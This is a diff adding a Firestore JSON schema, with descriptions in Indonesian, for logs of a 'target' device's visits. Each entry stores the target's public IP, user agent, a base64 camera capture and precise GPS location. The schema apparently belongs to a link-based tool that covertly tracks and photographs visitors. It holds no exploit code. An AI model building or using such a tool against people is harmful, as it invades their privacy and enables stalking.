@@ -1,0 +1,28 @@
+{
+  "entities": {
+    "LogEntry": {
+      "title": "LogEntry",
+      "description": "Log verifikasi kunjungan, kamera, dan koordinat satelit GPS presisi dari perangkat target",
+      "type": "object",
+      "properties": {
+        "id": { "type": "string", "description": "ID unik entri log" },
+        "sessionId": { "type": "string", "description": "Session ID perangkat target" },
+        "timestamp": { "type": "string", "description": "Waktu pencatatan ISO string" },
+        "type": { "type": "string", "description": "Tipe log: click atau full" },
+        "ip": { "type": "string", "description": "Alamat IP publik target" },
+        "device": { "type": "string", "description": "User Agent perangkat" },
+        "image": { "type": "string", "description": "Base64 capture foto kamera (dihapus otomatis setelah 30 hari)" },
+        "photoExpired": { "type": "boolean", "description": "Flag penanda apakah foto telah terhapus otomatis setelah 30 hari" },
+        "photoExpirationNotice": { "type": "string", "description": "Keterangan pembersihan memori foto setelah 1 bulan" },
+        "location": { "type": "object", "description": "Data koordinat GPS, reverse geocoding, dan akurasi" }
+      },
+      "required": ["id", "sessionId", "timestamp"]
+    }
+  },
+  "firestore": {
+    "/logs/{logId}": {
+      "schema": "LogEntry",
+      "description": "Koleksi data log kunjungan, lokasi GPS, dan capture validasi"
+    }
+  }
+}
